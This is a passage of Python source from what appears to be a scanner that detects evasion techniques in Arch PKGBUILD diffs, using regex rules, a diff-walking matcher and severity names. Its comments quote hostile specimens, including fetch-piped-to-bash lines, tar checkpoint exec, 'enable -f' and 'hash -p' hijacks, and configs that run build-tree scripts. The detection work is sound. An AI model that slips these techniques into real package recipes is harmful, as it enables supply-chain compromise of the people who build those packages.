    r"|setsid|unbuffer|script|LC_ALL=\S+|LANG=\S+|[A-Z_]+=\S*)"
    r"(?:\s+-[-\w]+)*\s+)+",
)

#: The pipeline only counts if its *head* is a download; a local `cat x |
#: foo` is not this rule's subject.
#: The clients X009 owns: everything R001/R002 do not already claim.
_X009_CLIENT_RE = re.compile(r"\b(?:" + _OTHER_FETCH_CLIENT + r")", re.IGNORECASE)

_X016_FETCH_RE = re.compile(r"(?:" + _NETWORK_CLIENT + r")", re.IGNORECASE)

_X016_CONSUMER_RE = re.compile(r"\A(?:" + _DATA_CONSUMER + r")\Z", re.IGNORECASE)

#: The sinks R001 owns. Standing down on them keeps one pipeline to one
#: claim; `_EXEC_WRAPPER` is stripped before the comparison for the same
#: reason the consumer test strips it.
_X016_KNOWN_EXECUTOR_RE = re.compile(
    r"\A(?:/(?:usr/)?bin/)?(?:" + SCRIPT_EXECUTOR + r")\Z", re.IGNORECASE)


def _pipeline_sink(body: str) -> str | None:
    """The command word after the last unquoted `|`, or ``None``.

    Quoting matters: `echo "a|b" | tar` has one pipe, not two, and reading
    the wrong one names `b"` as the sink.
    """
    depth_s = depth_d = False
    cut = -1
    for i, ch in enumerate(body):
        if ch == "'" and not depth_d:
            depth_s = not depth_s
        elif ch == '"' and not depth_s:
            depth_d = not depth_d
        elif ch == "|" and not depth_s and not depth_d:
            # `||` is an operator between commands, not a pipe - so it
            # *ends* the pipeline rather than voiding it. Returning None
            # here discarded the whole line, and `curl u | bash || true`
            # is how nearly every probe in the audit spells the shape:
            # the fallback is there so a failing payload does not fail the
            # build, and it hid the pipe that preceded it.
            if body[i - 1:i] == "|" or body[i + 1:i + 2] == "|":
                break
            cut = i
    if cut < 0:
        return None
    tail = body[cut + 1:].lstrip()
    tail = _PIPE_WRAPPER_RE.sub("", tail)
    # `xargs` runs what follows it, so the sink is that command and not
    # `xargs` itself: `fswatch … | xargs -0 -I{} bash x.sh` ends in a
    # shell. Its flags may carry braces (`-I{}`), which the general
    # wrapper pattern does not allow.
    xargs = re.match(r"xargs\b((?:\s+-[^\s]+)*)\s+", tail)
    if xargs:
        tail = tail[xargs.end():]
    word = re.split(r"[\s;&|<>()]", tail, maxsplit=1)[0]
    return word.strip("\"'") or None


# ---------------------------------------------------------------------------
# X017: a tool is asked to run something the recipe chose.
# ---------------------------------------------------------------------------
#
# Every rule that reads execution reads a *command*. These four spellings
# put the command somewhere a command is not expected - a flag value, a
# builtin's argument - and the recipe's own line looks like archive
# extraction, a file search, or shell configuration.
#
#   tar -xf d.tar --checkpoint-action=exec='sh payload.sh'
#   tar -xf d.tar --to-command='sh'
#   find "$srcdir" -name 'p*' -exec sh {} +
#   enable -f "$srcdir/payload.so" payload
#   hash -p "$srcdir/evil" gcc
#
# The first two run a command per archive checkpoint or per member; `find
# -exec` runs one per match, with `{}` as the argument so no path literal
# exists for any rule to pair; `enable -f` loads an arbitrary ELF into the
# running shell as a builtin; `hash -p` makes an existing name resolve to a
# file the recipe supplies, so a later `gcc` is not gcc.
#
# `find -exec` is narrowed to an executor because the ordinary use is the
# rule's opposite: `find "$pkgdir" -type f -exec chmod 644 {} +` is how
# permissions get fixed, and claiming it would claim the ecosystem.
X017_RE = re.compile(
    r"--checkpoint-action\s*=\s*[\"']?exec"
    r"|--to-command\s*="
    r"|\bfind\b[^\n;&|]{0,200}?-(?:exec|ok)(?:dir)?\s+"
    r"(?:" + _EXEC_WRAPPER + r")?(?:/(?:usr/)?bin/)?(?:" + SCRIPT_EXECUTOR + r")\b"
    r"|(?:\A\s*|[;&|(]\s*|&&\s*)enable\s+(?:-\w+\s+)*-f\b"
    r"|(?:\A\s*|[;&|(]\s*|&&\s*)hash\s+(?:-\w+\s+)*-p\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X021: the executor is literal and the file it runs is not.
# ---------------------------------------------------------------------------
#
# X002 asks whether the *command* can be read from the text. This asks the
# same question of its argument, which is the half that was open:
#
#   set -- *.sh;                  bash "$1"
#   mapfile -t A < <(ls *.sh);    bash "${A[0]}"
#   IFS=:;                        bash $*
#   set -- payload.sh;            bash $@
#
# `bash` is perfectly literal in every one, so X002 stands down and every
# path-pairing rule looks for a filename that is not there. What runs is
# decided by a glob, by word splitting, or by whatever was pushed into the
# positional parameters - at build time, on the attacker's machine, from a
# directory this analysis never listed.
#
# Measured against the benign corpus, an executor whose file argument is a
# positional parameter, an array element or a glob appears in *no* package
# at all: recipes name the file they mean.
#: `set -- *.sh` pushes the glob's result into the positional parameters,
#: and a later bare `"$@"` runs the first of them. Neither line names a
#: file, and neither is suspicious alone: `exec "$@"` is how a wrapper
#: forwards its arguments, which is the only spelling the benign corpus
#: has. The pairing is the observable.
_X021_SET_GLOB_RE = re.compile(r"(?:\A\s*|[;&|(]\s*|&&\s*)set\s+--\s+[^\n;&|]*\*")
_X021_RUN_POSITIONAL_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:" + _EXEC_WRAPPER + r")?[\"']?\$[@*]")

X021_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*|\b(?:do|then|else)\s+)"
    r"(?:" + _EXEC_WRAPPER + r")?(?:/(?:usr/)?bin/)?"
    r"(?:" + SCRIPT_EXECUTOR + r"|eval|source)\s+"
    r"[\"']?(?:"
    r"\$[@*]"                        # $@  $*
    r"|\$\{?[1-9]\}?"               # $1  ${1}
    r"|\$\{\w+\[[^\]]*\]\}"        # ${A[0]}  ${A[@]}
    r"|[\w./-]*\*[\w./-]*"          # *.sh  build/*.sh
    r")",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X022: the recipe writes a config, then hands it to the tool that reads it.
# ---------------------------------------------------------------------------
#
# The largest silent family in the whole audit, and the one the
# config-carried-exec thesis was really about:
#
#   printf "dhcp-script=$PWD/x.sh\n" > "$srcdir"/d
#   dnsmasq --conf-file="$srcdir"/d
#
#   printf "route { exec_dset(\"bash $PWD/x.sh\"); }\n" > "$srcdir"/k
#   kamailio -f "$srcdir"/k
#
# H089 and H093 claim a config that is *shipped* - generated into `$pkgdir`
# or committed to the repository - because a shipped file naming a build
# directory is broken on arrival. Neither applies here: the file stays in
# the build tree, where naming `$srcdir` is perfectly normal, and it is
# never installed anywhere.
#
# What makes it execution is the second line. The recipe writes a file
# whose content names a command, and then runs the program that reads that
# file - on the build machine, at build time. Nothing in the recipe looks
# like an execution, and the tool is doing exactly what it is for.
#
# The pairing is the observable, which is why this cannot be a line
# pattern. Writing a config is ordinary. Passing a filename to a program is
# ordinary. Writing a config whose body names a path in the build tree and
# then feeding it to something is the shape.
#: The write verb, matched on its own. The destination is found by
#: scanning for the *last* unquoted `>` rather than by a lazy span: config
#: bodies contain `>` themselves - `printf "<match **>\n…" > f` puts one
#: inside the content - and a lazy span stops at the first one, taking a
#: fragment of the payload as the filename.
_X022_WRITE_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:" + _EXEC_WRAPPER + r")?"
    r"(?:printf|echo|cat|tee)\b")


def _redirect_target(body: str) -> tuple[int, str] | None:
    """``(index_of_redirect, destination)`` for the last unquoted `>`."""
    depth_s = depth_d = False
    cut = -1
    for i, ch in enumerate(body):
        if ch == "'" and not depth_d:
            depth_s = not depth_s
        elif ch == '"' and not depth_s:
            depth_d = not depth_d
        elif ch == ">" and not depth_s and not depth_d:
            cut = i
    if cut < 0:
        return None
    tail = body[cut + 1:].lstrip(">").strip()
    dest = re.split(r"[\s;&|<>]", tail, maxsplit=1)[0]
    return (cut, dest) if dest else None

#: A build-tree path in the *content* being written.
_X022_PAYLOAD_RE = re.compile(r"\$\{?(?:srcdir|startdir|PWD|BUILDDIR)\}?/")


#: A flag that says "read configuration from here". Needed because a tool
#: may be pointed at the *directory* the config was written into rather
#: than at the file - `logwatch --configdir "$srcdir"` after writing
#: `"$srcdir"/lw`. Matching a bare `$srcdir` mention would claim half of
#: every recipe, so the flag is what makes the reference a configuration
#: reference.
_X022_CONFIG_FLAG_RE = re.compile(
    r"--?(?:c|conf|config|configdir|conf-dir|config-dir|conf-file"
    r"|config-file|config-directory|configfile|rcfile|rc|include"
    r"|settings|profile|f|file)[=\s]", re.IGNORECASE)


def _normalise_dest(token: str) -> str:
    """A destination as it will be written on the line that uses it."""
    return token.replace('"', "").replace("'", "").strip()


# ---------------------------------------------------------------------------
# X020: the recipe writes the build steps the engine will run.
# ---------------------------------------------------------------------------
#
# A build system reads its steps from a manifest - `build.ninja`,
# `Makefile`, `BUILD.bazel`, `meson.build`, a `*.mk`. Normally that
# manifest is upstream's, or generated by cmake or meson from upstream's.
# When the *recipe* writes one, the commands in it are the packager's, and
# they are data until the engine runs them: no execution rule reads a
# `command =` line, because nothing on that line is a command the shell
# executes.
#
# That is the whole technique. `cat > build.ninja` with
# `command = bash $srcdir/x.sh` inside puts an execution one indirection
# away from every rule that looks for one, and the invocation that follows
# is a bare `ninja -C build` that no reader would look at twice.
#
# The manifest names are bounded and small - a build system has to agree
# with upstream on what its file is called, which is the opposite of the
# unbounded daemon-config surface.
#: The same opener `delivery` reads; one spelling, one meaning.
_HEREDOC_OPEN_RE = re.compile(r"<<(-)?\s*['\"]?(\w+)['\"]?")

#: Verbs that write their arguments as content, rather than transforming
#: a file that already existed.
_CONTENT_WRITE_VERB_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:" + _EXEC_WRAPPER + r")?"
    r"(?:printf|echo|cat|tee)\b",
    re.IGNORECASE,
)

_BUILD_MANIFEST_RE = re.compile(
    r"(?:^|[\s\"'/])(?:build\.ninja|Makefile|makefile|GNUmakefile"
    r"|BUILD(?:\.bazel)?|WORKSPACE|meson\.build|CMakeLists\.txt"
    r"|SConstruct|SConscript|Justfile|justfile|Taskfile\.ya?ml"
    r"|[\w.-]+\.(?:mk|ninja|bazel|bzl|cmake))\b",
    re.IGNORECASE,
)

#: A manifest directive whose value the engine runs as a command.
_MANIFEST_COMMAND_RE = re.compile(
    r"(?:^|[\s;])(?:command|cmd|COMMAND|recipe|script|run|args|entrypoint)"
    r"\s*(?:=|:)"
    # A tab-indented Makefile recipe line, in both spellings: a real tab
    # in a heredoc body, and the `\t` a `printf` writes to produce one.
    r"|^\s*\t|\\t\s*\S"
    r"|\bgenrule\s*\(",
)


# ---------------------------------------------------------------------------
# X021: the engine is pointed at a manifest nobody read.
# ---------------------------------------------------------------------------
#
# The other half. `ninja -f gen.ninja`, `make -f build.mk`, `bazel build
# --override_repository=...`: the recipe names a specific manifest rather
# than letting the engine find upstream's. When that file is neither
# declared in `source=()` nor committed, its steps are chosen by something
# this analysis never saw.
#
# Anchored on an *explicit* `-f`/`--file` argument on purpose. A bare
# `make` or `ninja -C build` also runs a manifest nobody read, and that is
# most of the ecosystem - reporting it would say nothing. Naming a
# particular file is a choice, and the choice is the observable.
_MANIFEST_ARG_RE = re.compile(
    r"(?:\A\s*|[;&|(]\s*|&&\s*)(?:" + _EXEC_WRAPPER + r")?"
    r"(?:g?make|ninja|samu|bazel|buck2?|pants|scons|waf|just|task)\b"
    r"[^\n;&|]*?\s-(?:f|-file|-makefile)[=\s]+[\"']?"
    r"([^\"'\s;&|]+)",
    re.IGNORECASE,
)


def _consumer_at(lines: list[str], index: int) -> bool:
    """True when a compile or configure step runs at or after *index*.

    The scan reads added lines only, which is right for asking what a diff
    introduced and wrong for asking what an override redirects. An `export
    CC="$srcdir/mcc"` added directly above an *unchanged* `make` is the
    most suspicious shape the rule has - the attacker supplies one line and
    the existing recipe supplies the rest - and it was the one shape the
    rule could not see, because the consumer never carried a `+`.

    Context lines are therefore consulted for the consumer half only. The
    override still has to be an addition: an unchanged build that has
    always set `CC` is not a finding.
    """
    for line in lines[index:]:
        if line.startswith("-") or line.startswith("+++"):
            continue
        if not (line.startswith("+") or line.startswith(" ")):
            continue
        body = _strip_comment(line[1:])
        if X012_CONSUMER_RE.search(body):
            return True
    return False


# ---------------------------------------------------------------------------
# X024: indirect assignment to a sensitive variable
# ---------------------------------------------------------------------------
#
# A sensitive makepkg variable (DLAGENTS, COMPRESS*, PACMAN_AUTH, CFLAGS,
# LDFLAGS, MAKEFLAGS, PATH, LD_PRELOAD, LD_LIBRARY_PATH) is assigned a
# value that comes from another variable, a command substitution, or an
# array expansion.  The evasion: DLAGENTS=("${_agents[@]}") looks like a
# pass-through but the actual value was set in a function.  Good PKGBUILDs
# assign literal values to these variables.
_SENSITIVE_VAR_RE = re.compile(
    r"(?:DLAGENTS|COMPRESS(?:ZST|XZ|GZ|BZ2|LZ4|LRZ|LZO|LZ|Z)"
    r"|PACMAN_AUTH|CFLAGS|CXXFLAGS|LDFLAGS|MAKEFLAGS|RUSTFLAGS"
    r"|PATH|LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH)"
    r"\s*\+?=",
    re.IGNORECASE,
)
_INDIRECT_VALUE_RE = re.compile(
    r"\$\{?\w+[@\[\}]?|"   # ${var[@]}, ${var[}, ${var}, $var
    r"\$\(|"                # $(
    r"`"                     # backtick
)

X024_RE = re.compile(
    r"(?:" + _SENSITIVE_VAR_RE.pattern + r")"
    r"(?:\s*[\"'\(]*\s*)"  # optional quotes/parens between = and value
    r"(?:" + _INDIRECT_VALUE_RE.pattern + r")",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# X025: function shadow defined across multiple lines
# ---------------------------------------------------------------------------
#
# H097 catches `msg() {` on a single line.  This catches the multi-line
# variant where the function name and opening brace are on different lines,
# connected by a backslash-newline continuation.  Good PKGBUILDs do not
# split function definitions across lines.
_FUNC_CONTINUATION_RE = re.compile(
    r"^\s*(\w+)\s*\(\s*\)",
    re.IGNORECASE,
)
_FUNC_CONTINUATION_BODY_RE = re.compile(
    r"^\s*\{",
)


def _multiline_function_shadow_lines(lines):
    """Yield line numbers where a shadowed function is defined across lines."""
    from .build import _SHADOWED_NAMES
    i = 0
    while i < len(lines) - 1:
        line = lines[i]
        if not line.startswith("+"):
            i += 1
            continue
        body = line[1:].strip()
        m = _FUNC_CONTINUATION_RE.match(body)
        if m and m.group(1) in _SHADOWED_NAMES:
            j = i + 1
            while j < len(lines) and not lines[j].startswith("+"):
                j += 1
            if j < len(lines) and _FUNC_CONTINUATION_BODY_RE.match(lines[j][1:]):
                yield i + 1  # 1-indexed
                i = j + 1
                continue
        i += 1


def crossfire_techniques(diff_text: str) -> dict[str, list[tuple[int, str, str]]]:
    """``{rule_id: [(line, shape, quoted), ...]}`` for every technique found.

    Returned as data rather than findings so X007 can count techniques
    without re-deriving them, and so a caller can ask "what evasion is in
    this diff" without going through the scorer.
    """
    raw_lines = split_lines(clamp_text(diff_text))
    lines = join_line_continuations(raw_lines)
    from ..rules import _classify_enclosing_function
    from ..tokenizer import _variable_table

    enclosing = _classify_enclosing_function(lines)
    files = _file_at_line(lines)
    # Names the tokenizer reduced to a literal value. A command word that
    # resolves is not an evasion; one that does not is the whole point.
    readable = [
        ln[1:] for ln in lines
        if (ln.startswith("+") or ln.startswith(" ")) and not ln.startswith("+++")
    ]
    try:
        var_table, _array_table = _variable_table(readable)
        resolvable = frozenset(var_table) | _path_lookup_names(readable)
    except Exception:
        # Without the table every command word reads as unresolvable, which
        # is X002's whole trigger condition inverted: the family goes quiet
        # exactly when the recipe is hardest to parse.
        note_stage_failure("variable-resolution")
        resolvable = frozenset(_path_lookup_names(readable))
    carried = _continuation_lines(raw_lines, len(lines))
    found: dict[str, list[tuple[int, str, str]]] = {}
    #: X012 is the one rule here that spans two lines: an override is inert
    #: until a build step reads it.
    toolchain: list[tuple[int, str, str]] = []

    def record(rule_id, line_no, shape, quoted):
        found.setdefault(rule_id, []).append((line_no, shape, quoted[:120]))

    # X020 pairs a manifest *target* with the commands written into it, so
    # the heredoc region has to be tracked the way `_packaged_content_findings`
    # tracks it: the redirect names the file and the body carries the steps.
    manifest_delims: list[str] = []
    manifest_open = False
    positional_glob = False
    written_configs: dict[str, tuple[int, str]] = {}

    for index, line in enumerate(lines):
        if not line.startswith("+") or line.startswith("+++"):
            continue
        raw = line[1:]
        if _FENCE_RE.match(raw):
            continue

        stripped = raw.strip()
        if manifest_delims and stripped == manifest_delims[-1]:
            manifest_delims.pop()
            manifest_open = False
        elif manifest_delims:
            if manifest_open and _MANIFEST_COMMAND_RE.search(raw):
                record("X020", index + 1,
                       "recipe writes the build steps the engine runs",
                       raw.strip())
                manifest_open = False
        else:
            opener = _HEREDOC_OPEN_RE.search(raw)
            if opener and opener.group(2):
                manifest_delims.append(opener.group(2))
                manifest_open = bool(_BUILD_MANIFEST_RE.search(
                    raw[:opener.start()]))
            elif (">" in raw
                    and _BUILD_MANIFEST_RE.search(raw[raw.rfind(">"):])
                    # Authoring, not transforming. `sed -e ... Makefile >
                    # dest` rewrites steps that came from upstream - which
                    # is how a DKMS package substitutes a kernel version,
                    # and was this rule's only benign fire. `printf` and
                    # `echo` write steps the recipe chose.
                    and _CONTENT_WRITE_VERB_RE.search(raw[:raw.rfind(">")])
                    and _MANIFEST_COMMAND_RE.search(raw[:raw.rfind(">")])):
                record("X020", index + 1,
                       "recipe writes the build steps the engine runs",
                       raw.strip())
        body = _strip_comment(raw)
        if not body.strip():
            continue
        line_no = index + 1
        # Which file the line is in decides whether it is shell; the
        # function it sits in no longer decides anything, because
        # *top-level* code runs when makepkg sources the recipe - before
        # any build step, and before any rule that reads a function body.
        # A diff with no `+++` header (a fragment handed straight to
        # `scan_diff`) keeps the old function gate rather than losing
        # detection: unknown fails toward looking.
        path = files.get(index)
        if path is None:
            executing = _executes(enclosing.get(index))
        else:
            executing = bool(_SHELL_FILE_RE.search(path))

        # X006 is checked on every line, not only a `source=` one: the two
        # shapes it carries - a URL shortener and a raw-IP host - are never
        # legitimate anywhere in a recipe, and a fetch inside `build()` is
        # the same fact as one in the source array. This was written as an
        # if/else whose branches were identical, so the source-field test
        # decided nothing; it is stated once instead.
        for shape, pattern in X006_SHAPES:
            if pattern.search(body):
                record("X006", line_no, shape, body.strip())

        if not executing:
            continue

        if X001_RE.search(body):
            record("X001", line_no, "decode-to-shell", body.strip())

        # X002 is the one position-sensitive rule here, so it is the one
        # that must stand down on a line whose command position lives
        # further up. The rest match on content and are unaffected.
        if index not in carried:
            for word in _command_words(body, resolvable):
                for shape, pattern in X002_SHAPES:
                    if pattern.match(word):
                        record("X002", line_no, shape, body.strip())
                        break

        for shape, pattern in X003_SHAPES:
            if pattern.search(body):
                record("X003", line_no, shape, body.strip())

        for shape, pattern in X004_SHAPES:
            if pattern.search(body):
                record("X004", line_no, shape, body.strip())

        alias = _home_alias_hit(body)
        if alias:
            record("X005", line_no, alias, body.strip())

        space = _DECEPTIVE_SPACE_RE.search(body)
        if space:
            record("X008", line_no, f"U+{ord(space.group()):04X}", body.strip())

        # X022 - a config written here, handed to a tool below.
        target = _redirect_target(body) if _X022_WRITE_RE.search(body) else None
        if target:
            cut, dest = target
            if _X022_PAYLOAD_RE.search(body[:cut]):
                written_configs[_normalise_dest(dest)] = (line_no, body.strip())
        elif written_configs:
            plain = _normalise_dest(body)
            for path, (origin, quoted) in list(written_configs.items()):
                parent = path.rsplit("/", 1)[0] if "/" in path else ""
                names_file = len(path) > 2 and path in plain
                names_dir = (len(parent) > 2 and parent in plain
                             and _X022_CONFIG_FLAG_RE.search(body))
                if names_file or names_dir:
                    record("X022", origin,
                           "a generated config is handed to the tool that "
                           "reads it", quoted)
                    written_configs.clear()
                    break

        sink = _pipeline_sink(body)
        head = body.split("|", 1)[0]

        # X009 wanted the shell immediately after the pipe, so one filter
        # in between hid the whole chain: `dig +short txt e | head -c 2000
        # | bash` scored nothing. R001 and R002 read past intervening
        # stages for `curl` and `wget`, and the uncatalogued half did not -
        # the same asymmetry, in the rule written to cover the remainder.
        #
        # The sink is the one `_pipeline_sink` already computes for X016,
        # so both arms now ask about the *end* of the pipeline rather than
        # about the character after the first bar.
        if X009_RE.search(body) or (
                sink and _X009_CLIENT_RE.search(head)
                and _X016_KNOWN_EXECUTOR_RE.match(sink)):
            record("X009", line_no, "uncatalogued fetch to a shell", body.strip())

        if (sink
                and _X016_FETCH_RE.search(head)
                and not _X016_CONSUMER_RE.match(sink)
                and not _X016_KNOWN_EXECUTOR_RE.match(sink)):
            record("X016", line_no, f"fetch piped into {sink}", body.strip())

        # X023 - the pipeline ends in a shell and does not start with a
        # fetch. `pass otp e | bash`, `gpg-connect-agent … | bash`,
        # `cat /sys/kernel/tracing/trace | bash`, `perf script -i … | bash`:
        # the bytes are produced locally, so no fetch rule has anything to
        # say, and what runs is whatever that command printed.
        #
        # A fetch head is left to R001/R002 and X009, which say the more
        # specific thing. Everything else is claimed here, because no
        # package in the 3,246-diff benign corpus pipes anything at all
        # into a shell.
        if (sink
                and _X016_KNOWN_EXECUTOR_RE.match(sink)
                and not _X016_FETCH_RE.search(head)
                and not _X009_CLIENT_RE.search(head)):
            record("X023", line_no, "command output executed as a script",
                   body.strip())

        if _X021_SET_GLOB_RE.search(body):
            positional_glob = True
        elif positional_glob and _X021_RUN_POSITIONAL_RE.search(body):
            record("X021", line_no,
                   "a glob was pushed into the positional parameters and run",
                   body.strip())
            positional_glob = False

        if X021_RE.search(body):
            record("X021", line_no, "the file the executor runs is not a literal",
                   body.strip())

        if X017_RE.search(body):
            record("X017", line_no, "a tool is given a command to run",
                   body.strip())

        if X018_RE.search(body):
            record("X018", line_no,
                   "an interpreter one-liner assembles the name it calls",
                   body.strip())

        if X019_RE.search(body):
            record("X019", line_no, "host material sent or packaged",
                   body.strip())

        if X010_RE.search(body):
            record("X010", line_no, "interpreter reaches the network", body.strip())

        if X015_RE.search(body):
            record("X015", line_no, "work scheduled to run after the build",
                   body.strip())

        env_code = X014_RE.search(body)
        if env_code and not X014_STANDDOWN_RE.search(body):
            record("X014", line_no,
                   f"{env_code.group('var')} names code the shell will run",
                   body.strip())

        if X013_RE.search(body) and not X013_STANDDOWN_RE.search(body):
            record("X013", line_no, "fetch redirected or trust replaced",
                   body.strip())

        if X024_RE.search(body):
            record("X024", line_no,
                   "sensitive variable assigned an indirect value",
                   body.strip())

        # The stand-down is about *language* package managers, where a
        # local path means "install what this recipe just built".  For the
        # distribution's own tools it means the opposite: `pacman -U
        # ./evil.pkg.tar.zst` installs a local package as root, scriptlets
        # and all, and the leading `./` is not a mitigation.
        distro = _DISTRO_INSTALL_RE.search(body)
        if X011_RE.search(body) and (distro or not X011_STANDDOWN_RE.search(body)):
            record("X011", line_no, "package manager runs fetched code",
                   body.strip())

        override = X012_RE.search(body)
        if override and not toolchain and _consumer_at(lines, index + 1):
            # The override only matters because something later uses it.
            # The consumer is looked for from here rather than waited for,
            # because it need not be an added line: an override placed
            # above an *unchanged* `make` is the shape where the attacker
            # supplies one line and the existing recipe supplies the rest.
            toolchain.append((line_no, override.group("var"), body.strip()))
            record("X012", line_no,
                   f"{override.group('var')} points into the source tree",
                   body.strip())

    # X025: multi-line function shadow.  H097 catches `msg() {` on one
    # line; this catches the continuation variant where the brace is on
    # the next line.  Must run on raw lines before joining continuations.
    for shadow_line in _multiline_function_shadow_lines(raw_lines):
        record("X025", shadow_line,
               "function shadow defined across multiple lines",
               raw_lines[shadow_line - 1].strip())

    return found


_NAMES = {
    "X001": ("Encoded Payload Decoded And Executed", "CRITICAL"),
    "X002": ("Non-Literal Executable Name", "CRITICAL"),
    "X003": ("Obfuscated Command Argument", "HIGH"),
    "X004": ("Build Output Suppressed", "MEDIUM"),
    "X005": ("Home Reached By An Alternative Spelling", "HIGH"),
    "X006": ("Source Points Somewhere Unexpected", "HIGH"),
    "X008": ("Whitespace A Shell Does Not Split On", "MEDIUM"),
    "X009": ("Fetch Through An Uncatalogued Client", "CRITICAL"),
    "X010": ("Interpreter One-Liner Reaches The Network", "HIGH"),
    "X011": ("Package Manager Runs Fetched Code At Build Time", "HIGH"),
    "X012": ("Build Toolchain Redirected Into The Source Tree", "HIGH"),
    "X013": ("Fetch Redirected Or Trust Root Replaced", "HIGH"),
    "X014": ("Environment Variable Names Code To Run", "HIGH"),
    "X015": ("Work Scheduled To Run After The Build", "HIGH"),
    "X016": ("Fetch Piped Into An Unrecognised Consumer", "HIGH"),
    "X017": ("Tool Flag Or Builtin Carries A Command", "HIGH"),
    "X018": ("Interpreter One-Liner Assembles A Name", "HIGH"),
    "X019": ("Host Material Sent Or Packaged", "HIGH"),
    "X020": ("Recipe Writes The Build Steps The Engine Runs", "HIGH"),
    "X021": ("Executor Runs A File Chosen At Runtime", "HIGH"),
    "X022": ("Generated Config Handed To The Tool That Reads It", "HIGH"),
    "X023": ("Command Output Executed As A Script", "HIGH"),
    "X024": ("Indirect Sensitive Assignment", "HIGH"),
    "X025": ("Multi-Line Function Shadow", "HIGH"),
}

#: How many distinct techniques make a diff X007.  Two, because one technique
#: can be an accident of style and two in one diff is a method.
X007_MIN_TECHNIQUES = 2


def _crossfire_findings(diff_text, config, add) -> None:
    """Emit X001-X006 and the X007 cluster.

    Each rule reports once per diff: a second `${A[0]}` tells the reader
    nothing the first did not, and counting occurrences would let a noisy
    recipe outscore a careful attack.
    """
    techniques = crossfire_techniques(diff_text)

    for rule_id in ("X001", "X002", "X003", "X004", "X005", "X006", "X008",
                    "X009", "X010", "X011", "X012", "X013", "X014", "X015",
                    "X016", "X017", "X018", "X019", "X020", "X021", "X022",
                    "X023", "X024", "X025"):
        hits = techniques.get(rule_id)
        if not hits:
            continue
        line_no, shape, quoted = hits[0]
        name, severity = _NAMES[rule_id]
        add(rule_id, name, severity, "evasion",
            f"{shape}: {quoted}", line=line_no, shape=shape, body=quoted)

    if len(techniques) >= X007_MIN_TECHNIQUES:
        shapes = ", ".join(sorted(techniques))
        add("X007", "Multiple Evasion Techniques", "CRITICAL", "evasion",
            f"{len(techniques)} evasion techniques in one diff: {shapes}",
            line=None, count=len(techniques), techniques=shapes)
